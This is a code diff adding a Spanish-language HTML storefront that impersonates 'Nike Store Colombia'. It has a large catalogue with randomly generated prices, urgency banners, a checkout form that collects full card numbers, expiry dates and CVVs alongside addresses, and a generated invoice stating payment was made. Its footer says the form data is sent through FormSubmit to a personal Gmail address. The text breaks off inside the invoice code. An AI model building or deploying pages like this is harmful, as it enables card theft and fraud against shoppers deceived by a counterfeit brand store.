@@ -1,0 +1,1117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Nike Store Colombia | 300+ modelos · Envío rápido</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f5f7fc;
+      color: #1e293b;
+      padding: 0;
+      overflow-x: hidden;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+      width: 100%;
+      padding: 1.5rem 1rem;
+    }
+
+    .discount-banner {
+      background: linear-gradient(135deg, #e5552e, #ff8c42);
+      color: white;
+      text-align: center;
+      padding: 0.8rem 1rem;
+      font-weight: 700;
+      font-size: 1rem;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      animation: subtleGlow 2s infinite alternate;
+    }
+    .discount-banner span {
+      display: inline-block;
+      animation: pulseText 1.2s ease-in-out infinite;
+    }
+    @keyframes subtleGlow {
+      0% { background: linear-gradient(135deg, #e5552e, #ff8c42); }
+      100% { background: linear-gradient(135deg, #ff6b3d, #ffa559); }
+    }
+    @keyframes pulseText {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.02); }
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin: 1.5rem 0 1rem;
+    }
+    .logo {
+      font-size: 1.8rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #111, #555);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .logo span {
+      color: #e5552e;
+    }
+
+    .categories-selector {
+      margin-bottom: 2rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+      background: white;
+      padding: 0.8rem 1.2rem;
+      border-radius: 60px;
+      border: 1px solid #eef2f8;
+    }
+    .categories-selector label {
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+    .cat-select {
+      flex: 1;
+      min-width: 200px;
+      padding: 0.6rem 1rem;
+      border-radius: 60px;
+      border: 1px solid #cbd5e1;
+      background: white;
+      font-weight: 500;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .products-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2rem;
+    }
+
+    .product-card {
+      background: white;
+      border-radius: 1.5rem;
+      padding: 1.2rem;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.05);
+      transition: all 0.25s;
+      border: 1px solid #eef2f8;
+      display: flex;
+      flex-direction: column;
+    }
+    .product-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 20px 30px -10px rgba(0,0,0,0.1);
+    }
+    .product-image {
+      width: 100%;
+      height: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fafafa;
+      border-radius: 1rem;
+      margin-bottom: 1rem;
+      overflow: hidden;
+      cursor: pointer;
+    }
+    .product-image img {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+      transition: transform 0.3s ease;
+    }
+    .product-card:hover .product-image img {
+      transform: scale(1.02);
+    }
+    .product-title {
+      font-weight: 700;
+      font-size: 1rem;
+      margin-bottom: 0.2rem;
+    }
+    .product-brand {
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: #e5552e;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 0.4rem;
+    }
+    .product-category {
+      font-size: 0.7rem;
+      color: #5b6e8c;
+      margin-bottom: 0.6rem;
+    }
+    .price-container {
+      display: flex;
+      align-items: baseline;
+      gap: 0.6rem;
+      flex-wrap: wrap;
+      margin: 0.5rem 0;
+    }
+    .old-price {
+      font-size: 0.9rem;
+      color: #94a3b8;
+      text-decoration: line-through;
+    }
+    .discount-price {
+      font-weight: 800;
+      font-size: 1.3rem;
+      color: #e5552e;
+    }
+    .size-selector {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 0.5rem 0;
+      flex-wrap: wrap;
+    }
+    .size-selector label {
+      font-weight: 600;
+      font-size: 0.8rem;
+    }
+    select {
+      padding: 0.4rem 0.6rem;
+      border-radius: 40px;
+      border: 1px solid #cbd5e1;
+      background: white;
+      font-weight: 500;
+      font-size: 0.8rem;
+      font-family: 'Inter', sans-serif;
+    }
+    .quantity-selector {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      margin: 0.8rem 0 0.5rem;
+      flex-wrap: wrap;
+    }
+    .quantity-selector label {
+      font-weight: 600;
+      font-size: 0.8rem;
+    }
+    .quantity-select {
+      width: auto;
+      min-width: 80px;
+      padding: 0.5rem;
+      border-radius: 40px;
+      border: 1px solid #cbd5e1;
+      background: white;
+      font-weight: 600;
+    }
+    .subtotal {
+      font-size: 0.75rem;
+      font-weight: 500;
+      margin-top: 0.5rem;
+      border-top: 1px dashed #e2e8f0;
+      padding-top: 0.5rem;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .cart-summary {
+      background: white;
+      border-radius: 1.5rem;
+      padding: 1.2rem 1.8rem;
+      margin-top: 1rem;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      border: 1px solid #e2edf7;
+      position: sticky;
+      bottom: 1rem;
+      backdrop-filter: blur(8px);
+      background: rgba(255,255,255,0.95);
+    }
+    .total-box {
+      font-weight: 800;
+      font-size: 1.2rem;
+    }
+    .total-cop {
+      font-size: 1.5rem;
+      color: #1f4a6e;
+    }
+    .payment-group {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 0.5rem;
+    }
+    .shipping-info {
+      background: #eef2ff;
+      border-radius: 50px;
+      padding: 0.4rem 1rem;
+      font-size: 0.7rem;
+      color: #1e3a8a;
+      text-align: center;
+      white-space: nowrap;
+    }
+    .shipping-info strong {
+      color: #e5552e;
+    }
+    .btn-pay {
+      background: #111;
+      border: none;
+      padding: 0.8rem 1.8rem;
+      color: white;
+      font-weight: 700;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: 0.2s;
+      font-size: 0.9rem;
+    }
+    .btn-pay:hover {
+      background: #e5552e;
+      transform: scale(1.02);
+    }
+
+    .image-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.85);
+      align-items: center;
+      justify-content: center;
+      z-index: 1100;
+      cursor: pointer;
+    }
+    .image-modal img {
+      max-width: 90%;
+      max-height: 90%;
+      border-radius: 1rem;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 1rem;
+    }
+    .modal-content {
+      background: white;
+      max-width: 550px;
+      width: 100%;
+      border-radius: 2rem;
+      padding: 1.5rem;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 1.3rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+    .close-modal {
+      background: none;
+      border: none;
+      font-size: 1.8rem;
+      cursor: pointer;
+    }
+    .order-summary {
+      background: #f8fafc;
+      padding: 1rem;
+      border-radius: 1rem;
+      margin: 1rem 0;
+      font-size: 0.85rem;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .total-pay {
+      font-weight: 800;
+      text-align: center;
+      background: #eef2ff;
+      padding: 0.8rem;
+      border-radius: 60px;
+      margin-bottom: 1rem;
+    }
+    .section-title {
+      font-weight: 700;
+      margin: 1rem 0 0.5rem;
+      font-size: 0.9rem;
+      color: #1e293b;
+      border-left: 3px solid #e5552e;
+      padding-left: 0.6rem;
+    }
+    .input-group {
+      margin-bottom: 0.8rem;
+    }
+    .input-row {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      align-items: flex-end;
+    }
+    .input-group.half {
+      flex: 1;
+    }
+    input, select {
+      width: 100%;
+      padding: 0.7rem 1rem;
+      border-radius: 60px;
+      border: 1.5px solid #e2e8f0;
+      font-family: 'Inter', sans-serif;
+      background: white;
+    }
+    .error-msg {
+      color: #e53e3e;
+      font-size: 0.7rem;
+      margin-top: 0.2rem;
+    }
+    .btn-submit-payment {
+      background: #10b981;
+      border: none;
+      padding: 0.8rem;
+      border-radius: 60px;
+      font-weight: 700;
+      color: white;
+      width: 100%;
+      cursor: pointer;
+      margin-top: 0.5rem;
+    }
+    .success-message {
+      background: #10b981;
+      color: white;
+      padding: 0.7rem;
+      border-radius: 60px;
+      text-align: center;
+      margin-top: 1rem;
+    }
+    footer {
+      text-align: center;
+      margin-top: 2rem;
+      font-size: 0.7rem;
+      color: #6c757d;
+    }
+
+    @media (max-width: 640px) {
+      .products-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 1rem;
+      }
+      .product-image {
+        height: 150px;
+      }
+      .discount-price {
+        font-size: 1rem;
+      }
+      .cart-summary {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .payment-group {
+        align-items: stretch;
+        width: 100%;
+      }
+      .shipping-info {
+        white-space: normal;
+        font-size: 0.7rem;
+      }
+      .btn-pay {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="discount-banner">
+    🎉 <span>¡SOLO POR ESTE MES! 20% DE DESCUENTO EN TODO EL CALZADO</span> 🎉
+  </div>
+
+<div class="container">
+  <div class="header">
+    <div class="logo"><span>NIKE</span> STORE</div>
+    <div style="font-size: 0.8rem; color: gray;">✨ Más de 300 modelos · Envío exprés · 20% OFF</div>
+  </div>
+
+  <div class="categories-selector">
+    <label>📂 Filtrar por categoría:</label>
+    <select id="categorySelect" class="cat-select">
+      <option value="all">Todas las categorías</option>
+    </select>
+  </div>
+
+  <div class="products-grid" id="productsGrid"></div>
+
+  <div class="cart-summary">
+    <div class="total-box">💰 TOTAL A PAGAR: <span class="total-cop" id="grandTotalCOP">0</span> COP</div>
+    <div class="payment-group">
+      <div class="shipping-info">
+        🚚 <strong>Envíos:</strong> 12-24h hábiles. Paga antes de 10am y ¡recibe el mismo día!
+      </div>
+      <button class="btn-pay" id="openPayModalBtn">💳 Proceder al pago</button>
+    </div>
+  </div>
+  <footer>✔️ Entorno educativo — Los datos se envían a FormSubmit (justincortez1621@gmail.com) para simulación. Factura con verificación previa.</footer>
+</div>
+
+<!-- Modales -->
+<div id="imageModal" class="image-modal">
+  <img id="modalImage" src="" alt="Ampliación">
+</div>
+
+<div id="paymentModal" class="modal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <span>💳 Finalizar compra</span>
+      <button class="close-modal" id="closeModalBtn">&times;</button>
+    </div>
+    <div class="order-summary" id="modalOrderSummary"></div>
+    <div class="total-pay" id="modalTotal">Total: 0 COP</div>
+    
+    <div class="section-title">📦 Datos de envío y contacto</div>
+    <form id="paymentFormModal">
+      <div class="input-group">
+        <label>👤 Nombre de quien recibe el pedido</label>
+        <input type="text" id="fullName" placeholder="Ej: Juan Pérez" autocomplete="off">
+        <div class="error-msg" id="nameError"></div>
+      </div>
+      <div class="input-group">
+        <label>📧 Correo electrónico</label>
+        <input type="email" id="email" placeholder="cliente@ejemplo.com" autocomplete="off">
+        <div class="error-msg" id="emailError"></div>
+      </div>
+      <div class="input-group">
+        <label>🏠 Dirección</label>
+        <input type="text" id="address" placeholder="Calle, número, barrio" autocomplete="off">
+        <div class="error-msg" id="addressError"></div>
+      </div>
+      <div class="input-row">
+        <div class="input-group half">
+          <label>🏙️ Ciudad</label>
+          <input type="text" id="city" placeholder="Ciudad" autocomplete="off">
+          <div class="error-msg" id="cityError"></div>
+        </div>
+        <div class="input-group half">
+          <label>📞 Teléfono</label>
+          <input type="tel" id="phone" placeholder="310 123 4567" autocomplete="off">
+          <div class="error-msg" id="phoneError"></div>
+        </div>
+      </div>
+      
+      <div class="section-title">💳 Datos de pago</div>
+      <div class="input-group">
+        <label>📇 Número de tarjeta</label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+        <div class="error-msg" id="cardError"></div>
+      </div>
+      <div class="input-group">
+        <label>📅 Fecha expiración (MM/AA)</label>
+        <select id="expiryDateSelect">
+          <option value="">Seleccione MM/AA</option>
+        </select>
+        <div class="error-msg" id="expiryError"></div>
+      </div>
+      <div class="input-group">
+        <label>🔒 CVV</label>
+        <input type="text" id="cvv" placeholder="123" maxlength="4">
+        <div class="error-msg" id="cvvError"></div>
+      </div>
+      <button type="submit" class="btn-submit-payment">✅ Confirmar pago y envío</button>
+      <div id="paymentFeedback"></div>
+    </form>
+  </div>
+</div>
+
+<script>
+  // ========== CATEGORÍAS Y PRODUCTOS (más de 300 referencias) ==========
+  const categoryList = [
+    "airmax", "jordan", "dunk", "running", "casual", "sb", "airforce", "zoom", 
+    "acg", "lifestyle", "renew", "vintage", "utility", "hightop", "slipon", "trail", "golf"
+  ];
+  
+  const categoryDisplay = {
+    airmax: "Air Max", jordan: "Air Jordan", dunk: "Dunk", running: "Running", casual: "Casual",
+    sb: "Nike SB", airforce: "Air Force", zoom: "Zoom", acg: "ACG", lifestyle: "Lifestyle",
+    renew: "Renew", vintage: "Vintage", utility: "Utility", hightop: "High-Top", slipon: "Slip-On",
+    trail: "Trail", golf: "Golf"
+  };
+
+  // Lista ampliada de modelos clásicos (más de 70, incluyendo los nuevos)
+  const classicModels = [
+    "Air Max 90", "Air Max 97", "Air Max Plus", "Air Max 270", "Air Max 95", "Air Max 98", "Air Max 720",
+    "Air Max 1", "Air Max 200", "Air Max Tailwind", "Air Max Bella", "Air Max Pulse",
+    "Air Max 90 G", "Air Max 270 Go", "Air Max 90 Futura", "Air Max 1 '86", "Air Max Plus TN", "Air Max 270 React",
+    "Air Jordan 1 High", "Air Jordan 4 Retro", "Air Jordan 11", "Air Jordan 3", "Air Jordan 5", "Air Jordan 6", "Air Jordan 12",
+    "Air Jordan 1 Mid", "Air Jordan 1 Low", "Air Jordan 2", "Air Jordan 7", "Air Jordan 8", "Air Jordan 9", "Air Jordan 10",
+    "Air Jordan 1 Mid SE", "Air Jordan 1 Zoom CMFT", "Air Jordan 2 Retro", "Air Jordan 6 Rings", "Air Jordan 1 Low SE", 
+    "Air Jordan 4 RM", "Air Jordan 7 Retro",
+    "Dunk Low Panda", "Dunk High Retro", "Dunk Low Syracuse", "Dunk Low Kentucky", "Dunk Low Chicago",
+    "Dunk Low Plum", "Dunk High Varsity", "Dunk Low Veneer",
+    "Dunk Low Disrupt", "Dunk High Up", "Dunk Low Next Nature", "Dunk Low Remastered", "Dunk Low Twist",
+    "ZoomX Vaporfly", "Pegasus 40", "Revolution 6", "Structure 24", "Winflo 9", "Wildhorse 8",
+    "Infinity Run 4", "Zoom Fly 5", "ZoomX Invincible", "Terra Kiger 9",
+    "Revolution 7", "Downshifter 13", "Winflo 11", "Structure 25", "Motiva",
+    "Blazer Mid '77", "Court Vision Low", "Chron 2", "Suede Classic", "Waffle One", "Cortez", "Tailwind 79", "Daybreak",
+    "Court Borough Low 2", "Court Vision Mid", "Court Legacy Lift", "Court Royale 2", "Killshot 2", "Waffle Debut",
+    "Air Force 1 '07", "Air Force 1 Shadow", "Air Force 1 Low", "Air Force 1 High",
+    "Air Force 1 Low '07 LV8", "Air Force 1 Shadow SE", "Air Force 1 Fontanka", "Air Force 1 Crater",
+    "SB Dunk Low", "SB Zoom Blazer", "SB Force 58", "SB Janoski", "SB Dunk High", "SB Dunk Mid",
+    "Zoom Freak 4", "Zoom LeBron NXXT", "Zoom KD 15", "Zoom GP", "Zoom Vomero 5",
+    "ACG Mountain Fly", "ACG Watercat+", "ACG Lowcate", "ACG Rufus", "ACG Moc",
+    "Renew Run", "Renew Ride", "Renew Element", "Renew 1000",
+    "Vintage 87", "Vintage Blazer", "Vintage Court",
+    "Utility Trainer", "Utility Max", "Utility Sport",
+    "High Top 77", "High Top Retro", "High Top Lace",
+    "Slip-On Comfort", "Slip-On Slide", "Slip-On Skate",
+    "Trail GORE-TEX", "Trail Runner", "Trail Endurance",
+    "Golf Air Max", "Golf Dunk", "Golf Pegasus"
+  ];
+
+  // Generar PRODUCTOS (más de 300)
+  let PRODUCTS = [];
+  let productId = 1;
+
+  function getCategoryFromName(name) {
+    if (name.includes("Air Max")) return "airmax";
+    if (name.includes("Air Jordan")) return "jordan";
+    if (name.includes("Dunk")) return "dunk";
+    if (name.includes("Zoom") || name.includes("Pegasus") || name.includes("Revolution") || name.includes("Structure") || name.includes("Winflo") || name.includes("Wildhorse") || name.includes("Infinity") || name.includes("Fly") || name.includes("Kiger") || name.includes("Vaporfly") || name.includes("Invincible") || name.includes("Terra") || name.includes("Downshifter") || name.includes("Motiva")) return "running";
+    if (name.includes("Blazer") || name.includes("Court") || name.includes("Chron") || name.includes("Suede") || name.includes("Waffle") || name.includes("Cortez") || name.includes("Tailwind") || name.includes("Daybreak") || name.includes("Killshot")) return "casual";
+    if (name.includes("Air Force")) return "airforce";
+    if (name.includes("SB")) return "sb";
+    if (name.includes("ACG")) return "acg";
+    if (name.includes("Renew")) return "renew";
+    if (name.includes("Vintage")) return "vintage";
+    if (name.includes("Utility")) return "utility";
+    if (name.includes("High Top")) return "hightop";
+    if (name.includes("Slip-On")) return "slipon";
+    if (name.includes("Trail")) return "trail";
+    if (name.includes("Golf")) return "golf";
+    return "lifestyle";
+  }
+
+  classicModels.forEach((name, idx) => {
+    const cat = getCategoryFromName(name);
+    const originalPrice = Math.floor(Math.random() * (850000 - 250000 + 1) + 250000);
+    const discounted = Math.round(originalPrice * 0.8);
+    const imageUrls = [
+      "https://images.unsplash.com/photo-1542291026-7eec264c27ff",
+      "https://images.unsplash.com/photo-1584735175315-9d2df23860f2",
+      "https://images.unsplash.com/photo-1606107557195-0e29a4b5b4aa",
+      "https://images.unsplash.com/photo-1600185365483-26d7a4cc7519",
+      "https://images.unsplash.com/photo-1579298245158-33e8f568f7d3",
+      "https://images.unsplash.com/photo-1525966222134-fcfa99b8ae77",
+      "https://images.unsplash.com/photo-1605348532760-6753d2c43329",
+      "https://images.unsplash.com/photo-1608231387042-66d8b6912e9e",
+      "https://images.unsplash.com/photo-1597045566677-8c032e3e85b9",
+      "https://images.unsplash.com/photo-1600185365926-3a2ce3cdb9eb"
+    ];
+    const imgUrl = imageUrls[productId % imageUrls.length] + "?w=500&h=500&fit=crop";
+    PRODUCTS.push({
+      id: productId++,
+      name: name,
+      category: cat,
+      originalPrice: originalPrice,
+      price: discounted,
+      image: imgUrl,
+      brand: cat === "jordan" ? "Jordan" : "Nike",
+      catName: categoryDisplay[cat]
+    });
+  });
+
+  // Completar hasta tener al menos 320 productos
+  for (let cat of categoryList) {
+    let needed = 0;
+    if (cat === "airmax") needed = 22;
+    else if (cat === "jordan") needed = 22;
+    else if (cat === "dunk") needed = 18;
+    else if (cat === "running") needed = 22;
+    else if (cat === "casual") needed = 20;
+    else if (cat === "sb") needed = 16;
+    else if (cat === "airforce") needed = 18;
+    else if (cat === "zoom") needed = 16;
+    else if (cat === "acg") needed = 14;
+    else if (cat === "lifestyle") needed = 16;
+    else if (cat === "renew") needed = 14;
+    else if (cat === "vintage") needed = 14;
+    else if (cat === "utility") needed = 14;
+    else if (cat === "hightop") needed = 14;
+    else if (cat === "slipon") needed = 12;
+    else if (cat === "trail") needed = 12;
+    else if (cat === "golf") needed = 12;
+    
+    const currentCount = PRODUCTS.filter(p => p.category === cat).length;
+    for (let i = 0; i < Math.max(0, needed - currentCount); i++) {
+      const suffix = ["Pro", "LTD", "SE", "OG", "Remastered", "Next Gen", "Elite", "Essential", "Classic", "Edition", "Premium", "Ultra"];
+      const modelNum = Math.floor(Math.random() * 90) + 10;
+      const name = `${categoryDisplay[cat]} ${modelNum} ${suffix[i % suffix.length]}`;
+      const originalPrice = Math.floor(Math.random() * (850000 - 250000 + 1) + 250000);
+      const discounted = Math.round(originalPrice * 0.8);
+      const imageUrls = [
+        "https://images.unsplash.com/photo-1542291026-7eec264c27ff",
+        "https://images.unsplash.com/photo-1584735175315-9d2df23860f2",
+        "https://images.unsplash.com/photo-1606107557195-0e29a4b5b4aa",
+        "https://images.unsplash.com/photo-1600185365483-26d7a4cc7519",
+        "https://images.unsplash.com/photo-1579298245158-33e8f568f7d3",
+        "https://images.unsplash.com/photo-1525966222134-fcfa99b8ae77",
+        "https://images.unsplash.com/photo-1605348532760-6753d2c43329",
+        "https://images.unsplash.com/photo-1608231387042-66d8b6912e9e",
+        "https://images.unsplash.com/photo-1597045566677-8c032e3e85b9",
+        "https://images.unsplash.com/photo-1600185365926-3a2ce3cdb9eb"
+      ];
+      const imgUrl = imageUrls[productId % imageUrls.length] + "?w=500&h=500&fit=crop";
+      PRODUCTS.push({
+        id: productId++,
+        name: name,
+        category: cat,
+        originalPrice: originalPrice,
+        price: discounted,
+        image: imgUrl,
+        brand: cat === "jordan" ? "Jordan" : "Nike",
+        catName: categoryDisplay[cat]
+      });
+    }
+  }
+
+  PRODUCTS = PRODUCTS.slice(0, 330);
+
+  // Tallas EUR/US
+  const sizeMapping = [
+    { eur: "35", us: "4.5" }, { eur: "36", us: "5.5" }, { eur: "37", us: "6" },
+    { eur: "38", us: "6.5" }, { eur: "39", us: "7" }, { eur: "40", us: "7.5" },
+    { eur: "41", us: "8" }, { eur: "42", us: "8.5" }, { eur: "43", us: "9.5" },
+    { eur: "44", us: "10" }, { eur: "45", us: "10.5" }, { eur: "46", us: "11.5" },
+    { eur: "47", us: "12" }, { eur: "48", us: "13" }
+  ];
+  const sizeOptions = sizeMapping.map(s => ({ value: s.eur, label: `EUR ${s.eur} / US ${s.us}` }));
+  const quantityOptions = Array.from({ length: 11 }, (_, i) => ({ value: i, label: i.toString() }));
+
+  let productState = PRODUCTS.map(() => ({ quantity: 0, size: "40" }));
+  let activeCategory = "all";
+
+  function formatCOP(value) {
+    return new Intl.NumberFormat('es-CO').format(Math.round(value));
+  }
+
+  function renderProducts() {
+    const grid = document.getElementById('productsGrid');
+    grid.innerHTML = '';
+    const filtered = activeCategory === "all" ? PRODUCTS : PRODUCTS.filter(p => p.category === activeCategory);
+    filtered.forEach(prod => {
+      const idx = PRODUCTS.findIndex(p => p.id === prod.id);
+      const state = productState[idx];
+      const qty = state.quantity;
+      const selectedSize = state.size;
+      const subtotal = qty * prod.price;
+      const sizeSelectHtml = sizeOptions.map(opt => 
+        `<option value="${opt.value}" ${selectedSize === opt.value ? 'selected' : ''}>${opt.label}</option>`
+      ).join('');
+      const qtySelectHtml = quantityOptions.map(opt => 
+        `<option value="${opt.value}" ${qty === opt.value ? 'selected' : ''}>${opt.label}</option>`
+      ).join('');
+      const card = document.createElement('div');
+      card.className = 'product-card';
+      card.innerHTML = `
+        <div class="product-image" data-img="${prod.image}">
+          <img src="${prod.image}" alt="${prod.name}" loading="lazy">
+        </div>
+        <div class="product-title">${prod.name}</div>
+        <div class="product-brand">${prod.brand}</div>
+        <div class="product-category">${prod.catName}</div>
+        <div class="price-container">
+          <span class="old-price">$${formatCOP(prod.originalPrice)} COP</span>
+          <span class="discount-price">$${formatCOP(prod.price)} COP</span>
+        </div>
+        <div class="size-selector">
+          <label>Talla (EUR/US):</label>
+          <select class="size-select" data-id="${prod.id}">
+            ${sizeSelectHtml}
+          </select>
+        </div>
+        <div class="quantity-selector">
+          <label>Cantidad:</label>
+          <select class="quantity-select" data-id="${prod.id}">
+            ${qtySelectHtml}
+          </select>
+        </div>
+        <div class="subtotal" id="subtotal-${prod.id}">
+          <span>Subtotal:</span> <span>$${formatCOP(subtotal)} COP</span>
+        </div>
+      `;
+      grid.appendChild(card);
+    });
+
+    document.querySelectorAll('.size-select').forEach(select => {
+      select.addEventListener('change', (e) => {
+        const productId = parseInt(e.target.dataset.id);
+        const idx = PRODUCTS.findIndex(p => p.id === productId);
+        productState[idx].size = e.target.value;
+        updateTotals();
+        renderProducts();
+      });
+    });
+
+    document.querySelectorAll('.quantity-select').forEach(select => {
+      select.addEventListener('change', (e) => {
+        const productId = parseInt(e.target.dataset.id);
+        const idx = PRODUCTS.findIndex(p => p.id === productId);
+        let val = parseInt(e.target.value);
+        if (isNaN(val)) val = 0;
+        productState[idx].quantity = val;
+        updateTotals();
+        renderProducts();
+      });
+    });
+
+    document.querySelectorAll('.product-image').forEach(imgDiv => {
+      imgDiv.addEventListener('click', (e) => {
+        const imgSrc = imgDiv.dataset.img;
+        document.getElementById('modalImage').src = imgSrc;
+        document.getElementById('imageModal').style.display = 'flex';
+      });
+    });
+  }
+
+  function updateTotals() {
+    let totalCOP = 0;
+    PRODUCTS.forEach((prod, idx) => {
+      const qty = productState[idx].quantity;
+      const subtotal = qty * prod.price;
+      totalCOP += subtotal;
+      const subtotalSpan = document.getElementById(`subtotal-${prod.id}`);
+      if (subtotalSpan) {
+        subtotalSpan.innerHTML = `<span>Subtotal:</span> <span>$${formatCOP(subtotal)} COP</span>`;
+      }
+    });
+    document.getElementById('grandTotalCOP').innerText = formatCOP(totalCOP);
+    return totalCOP;
+  }
+
+  function getCurrentTotal() {
+    return PRODUCTS.reduce((acc, prod, idx) => acc + (productState[idx].quantity * prod.price), 0);
+  }
+
+  function buildOrderSummary() {
+    let items = [];
+    PRODUCTS.forEach((prod, idx) => {
+      const qty = productState[idx].quantity;
+      if (qty > 0) {
+        const tallaEUR = productState[idx].size;
+        const usLabel = sizeMapping.find(s => s.eur === tallaEUR)?.us || '';
+        items.push({
+          name: prod.name,
+          category: prod.catName,
+          size: `EUR ${tallaEUR} / US ${usLabel}`,
+          quantity: qty,
+          unitPrice: prod.price,
+          subtotal: qty * prod.price
+        });
+      }
+    });
+    return items;
+  }
+
+  // ========== FACTURA PDF ==========
+  async function generateAndDownloadInvoice(customerData, items, total, invoiceNumber) {
+    const invoiceDiv = document.createElement('div');
+    invoiceDiv.style.position = 'absolute';
+    invoiceDiv.style.top = '-9999px';
+    invoiceDiv.style.left = '-9999px';
+    invoiceDiv.style.width = '800px';
+    invoiceDiv.style.background = 'white';
+    invoiceDiv.style.padding = '30px';
+    invoiceDiv.style.fontFamily = 'Inter, sans-serif';
+    invoiceDiv.style.color = '#1e293b';
+    invoiceDiv.innerHTML = `
+      <div style="text-align: center; margin-bottom: 20px;">
+        <h1 style="color: #e5552e;">NIKE STORE COLOMBIA</h1>
+        <p>Factura de venta - ${invoiceNumber}</p>
+        <p>Fecha: ${new Date().toLocaleString()}</p>
+        <p style="background: #eef2ff; display: inline-block; padding: 4px 12px; border-radius: 30px;"><strong>✅ Pago realizado</strong></p>
+      </div>
+      <div style="border-top: 1px solid #e2e8f0; padding-top: 15px;">
+        <h3>Datos del cliente</h3>
+        <p><strong>Nombre:</strong> ${customerData.nombre_recibe}</p>
+        <p><strong>Email:</strong> ${customerData.email}</p>
+        <p><strong>Dirección:</strong> ${customerData.direccion}</p>
+        <p><strong>Ciudad:</strong> ${customerData.ciudad}</p>
+        <p><strong>Teléfono:</strong> ${customerData.telefono}</p>
+      </div>
+      <div style="margin: 20px 0;">
+        <h3>Detalle del pedido</h3>
+        <table style="width:100%; border-collapse: collapse;">
+          <thead>
+            <tr><th style="border-bottom:1px solid #cbd5e1; text-align:left">Producto</th>
+              <th style="border-bottom:1px solid #cbd5e1; text-align:left">Categoría</th>
+              <th style="border-bottom:1px solid #cbd5e1; text-align:left">Talla</th>
+              <th style="border-bottom:1px solid #cbd5e1; text-align:center">Cant.</th>
+              <th style="border-bottom:1px solid #cbd5e1; text-align:right">Precio unit.</th>
+              <th style="border-bottom:1px solid #cbd5e1; text-align:right">Subtotal</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${items.map(item => `
+              <tr>
+                <td style="padding:8px;">${item.name}</td>
+                <td style="padding:8px;">${item.category}</td>
+                <td style="padding:8px;">${item.size}</td>
+                <td style="padding:8px; text-align:center">${item.quantity}</td>
+                <td style="padding:8px; text-align:right">$${formatCOP(item.unitPrice)} COP</td>
+                <td style="padding:8px; text-align:right">$${formatCOP(item.subtotal)} COP</td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+      </div>
+      <div style="text-align: right; border-top: 2px solid #e2e8f0; padding-top: 15px;">
+        <h2>TOTAL: $${formatCOP(total)} COP</h2>
+        <p style="font-size:12px;">* Envíos 12-24h hábiles. Antes de 10am, llega el mismo día.</p>
+        <p style="font-size:12px; color:#e5552e;"><strong>⚠️ Esta factura está sujeta a previa verificación de datos.</strong></p>
+        <p style="font-size:12px;">Gracias por comprar en Nike Store Colombia.</p>
+      </div>
+    `;
+    document.body.appendChild(invoiceDiv);
+    
+    const canvas = await html2canvas(invoiceDiv, { scale: 2 });
+    const imgData = canvas.toDataURL('image/png');
+    const { jsPDF } = window.jspdf;
+    const pdf = new jsPDF('p', 'mm', 'a4');
+    const imgWidth = 210;
+    const pageHeight = 297;
+    const imgHeight = (canvas.height * imgWidth) / canvas.width;
+    let position = 0;
+    pdf.addImage(imgData, 'PNG', 0, position, imgWidth, imgHeight);
+    if (imgHeight > pageHeight) {
+      let heightLeft = imgHeight - pageHeight;
+      position = -pageHeight;
+      while (heightLeft > 0) {
+        pdf.addPage();
+        pdf.addImage(imgData, 'PNG', 0, position, imgWidth, imgHeight);
+        heightLeft -= pageHeight;
+        position -= pageHeight;
